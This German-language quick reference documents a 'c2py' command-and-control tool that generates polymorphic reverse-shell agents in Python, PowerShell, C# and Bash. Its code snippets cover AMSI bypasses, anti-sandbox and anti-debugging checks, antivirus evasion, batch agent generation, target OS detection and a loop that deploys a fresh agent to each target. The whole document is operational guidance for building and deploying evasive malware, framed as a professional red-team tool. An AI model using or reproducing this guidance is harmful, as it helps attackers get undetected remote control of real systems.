# Polymorphic Obfuscation - Quick Reference

## Schnellstart

### 1. In der GUI verwenden

```
1. c2_gui.py starten
2. Payload Generator öffnen
3. Encoder wählen:
   - "Polymorphic Python"
   - "Polymorphic PowerShell"  
   - "Polymorphic C#"
4. Generate klicken
```

### 2. Im Code verwenden

```python
from polymorphic_obfuscator import PolymorphicObfuscator

# Obfuscator erstellen
obf = PolymorphicObfuscator(obfuscation_level='high')

# Agent generieren
agent = obf.obfuscate_python("", "192.168.1.100", 4444)
print(agent['code'])
```

### 3. Mit AV Evasion Engine

```python
from av_evasion_engine import AVEvasionEngine

engine = AVEvasionEngine()
agent = engine.generate_polymorphic_agent(
    "192.168.1.100", 4444, 'python', 'high'
)
```

## Obfuscation Levels

| Level   | Verwendung                    |
|---------|-------------------------------|
| low     | Tests, Entwicklung            |
| medium  | Standard Operationen          |
| high    | ⭐ Red Team Ops (empfohlen)  |
| extreme | Maximum Stealth               |

## Unterstützte Sprachen

### Python
```python
agent = obf.obfuscate_python("", lhost, lport)
```
- XOR/Multi-XOR/Rotate/Substitute Encryption
- Dead Code Injection
- Anti-Debugging

### PowerShell
```python
agent = obf.obfuscate_powershell(lhost, lport)
```
- 3x AMSI Bypass Varianten
- Variable Obfuscation
- Command Randomization

### C#
```python
agent = obf.obfuscate_csharp(lhost, lport)
```
- Anti-Sandbox Checks
- DLL Detection
- Timing Analysis

### Bash
```python
agent = obf.obfuscate_bash(lhost, lport)
```
- Base64/Hex/Octal Encoding
- Variable Randomization

## Verschlüsselungsmethoden

```python
# Automatisch zufällig gewählt:
- XOR: Standard encryption
- Multi-XOR: 2-4 passes
- Rotate: ROT-N cipher
- Substitute: Position-based XOR
```

## Wichtige Features

### ✅ Jede Generierung ist Einzigartig
```python
agent1 = obf.obfuscate_python("", "192.168.1.100", 4444)
agent2 = obf.obfuscate_python("", "192.168.1.100", 4444)
# agent1 != agent2  # True!
```

### ✅ Variable Randomization
```python
# Verschiedene Benennungsstrategien:
- Lesbare Namen: "hirojewm", "zekofnim"
- Random: "x8k2p9", "q3m7n1"
- Mixed-Case: "HjRoWm", "ZkOfNm"
- Underscore: "hi_ro_je", "ze_ko_ni"
```

### ✅ Dead Code Injection
```python
# Fügt sinnlose aber valide Funktionen ein:
def func_12345(p, q):
    return p + 42
```

### ✅ String Encoding
```python
# 7 Methoden:
- Base64
- Hex
- ROT13
- XOR
- Reverse Base64
- Custom Alphabet
- Chunk Encoding
```

## Agent Mutation

```python
from polymorphic_obfuscator import AgentMutator

mutator = AgentMutator()
mutated = mutator.mutate_agent(code, 'python', 0.5)
```

## Batch Generation

```python
# Mehrere Agents generieren
for i in range(10):
    agent = obf.obfuscate_python("", "192.168.1.100", 4444)
    with open(f'agent_{i}.py', 'w') as f:
        f.write(agent['code'])
```

## Testing

```bash
# Basis Test
python3 polymorphic_obfuscator.py

# Kompletter Test
python3 test_polymorphic.py

# Output
# ✅ Alle Tests sollten PASSen
```

## Rückgabewerte

```python
agent = obf.obfuscate_python("", "192.168.1.100", 4444)

# Dictionary mit:
agent['code']                 # Der generierte Code
agent['language']            # 'python'
agent['obfuscation_level']   # 'high'
agent['encryption_method']   # 'xor', 'xor_multi', etc.
agent['techniques']          # Liste der Techniken
```

### PowerShell
```python
agent = obf.obfuscate_powershell("192.168.1.100", 4444)
# + agent['language'] = 'powershell'
```

### C#
```python
agent = obf.obfuscate_csharp("192.168.1.100", 4444)
# + agent['namespace']
# + agent['class']
# + agent['compile_command']
```

### Bash
```python
agent = obf.obfuscate_bash("192.168.1.100", 4444)
# + agent['encoding'] = 'base64', 'hex', 'octal'
```

## Performance

| Sprache    | Low   | High  | Extreme |
|------------|-------|-------|---------|
| Python     | 0.05s | 0.2s  | 0.5s    |
| PowerShell | 0.03s | 0.15s | 0.4s    |
| C#         | 0.06s | 0.25s | 0.6s    |
| Bash       | 0.02s | 0.1s  | 0.3s    |

## Häufige Fehler

### Import Error
```python
# Fehler: ModuleNotFoundError: No module named 'polymorphic_obfuscator'
# Lösung: Im richtigen Verzeichnis sein
cd /path/to/c2py
python3 script.py
```

### KeyError
```python
# Fehler: KeyError: 'data_var'
# Lösung: Update auf neueste Version
git pull
```

## Integration Beispiele

### Mit Elite Reverse Shell Generator
```python
from elite_revshell_generator import EliteRevShellGenerator

gen = EliteRevShellGenerator()
payload = gen.generate(
    'C2PY Agents', 
    'Advanced Python',
    0,
    '192.168.1.100',
    4444,
    'Polymorphic Python'  # ← Encoder
)
```

### Mit Payload Coordinator
```python
from payload_coordinator import PayloadCoordinator
from av_evasion_engine import AVEvasionEngine

coord = PayloadCoordinator()
engine = AVEvasionEngine()

# OS Detection
target_os, _ = coord.detect_target_os("192.168.1.100")

# Angepasster Agent
agent_type = 'python' if 'Linux' in target_os else 'powershell'
agent = engine.generate_polymorphic_agent(
    "192.168.1.100", 4444, agent_type, 'high'
)
```

## Best Practices

### 1. Immer 'high' oder 'extreme' für Production
```python
obf = PolymorphicObfuscator(obfuscation_level='high')  # ✅
```

### 2. Jede Operation neue Generierung
```python
# ❌ FALSCH - Agent wiederverwenden
agent = obf.obfuscate_python("", "192.168.1.100", 4444)
use_agent_multiple_times(agent)

# ✅ RICHTIG - Jedes mal neu generieren
for target in targets:
    agent = obf.obfuscate_python("", target, 4444)
    deploy_agent(agent)
```

### 3. Teste immer in sicherer Umgebung
```bash
# In VM/Container
python3 test_polymorphic.py
```

### 4. Dokumentiere verwendete Agents
```python
import json
from datetime import datetime

agent = obf.obfuscate_python("", "192.168.1.100", 4444)

metadata = {
    'timestamp': datetime.now().isoformat(),
    'target': '192.168.1.100:4444',
    'language': agent['language'],
    'encryption': agent['encryption_method'],
    'size': len(agent['code'])
}

with open('agent_metadata.json', 'w') as f:
    json.dump(metadata, f, indent=2)
```

## Cheat Sheet

```python
# Basis
from polymorphic_obfuscator import PolymorphicObfuscator
obf = PolymorphicObfuscator('high')

# Python
py = obf.obfuscate_python("", "IP", PORT)

# PowerShell  
ps = obf.obfuscate_powershell("IP", PORT)

# C#
cs = obf.obfuscate_csharp("IP", PORT)

# Bash
bash = obf.obfuscate_bash("IP", PORT)

# Mit AV Evasion
from av_evasion_engine import AVEvasionEngine
e = AVEvasionEngine()
a = e.generate_polymorphic_agent("IP", PORT, 'python', 'high')

# Mutation
from polymorphic_obfuscator import AgentMutator
m = AgentMutator()
mut = m.mutate_agent(code, 'python', 0.5)
```

## Weitere Informationen

- **Vollständige Doku**: [POLYMORPHIC_OBFUSCATION.md](POLYMORPHIC_OBFUSCATION.md)
- **Hauptdoku**: [README.md](README.md)
- **Tests**: [test_polymorphic.py](test_polymorphic.py)
- **Source**: [polymorphic_obfuscator.py](polymorphic_obfuscator.py)

## Support

```bash
# Tests ausführen
python3 test_polymorphic.py

# Basis Test
python3 polymorphic_obfuscator.py

# Einzelne Funktionen testen
python3 -c "from polymorphic_obfuscator import PolymorphicObfuscator; \
    o = PolymorphicObfuscator('high'); \
    a = o.obfuscate_python('', '127.0.0.1', 4444); \
    print('✅ OK:', len(a['code']), 'bytes')"
```

---

**🛡️ c2py Polymorphic Obfuscation Engine**
*Professional Red Team Tool*
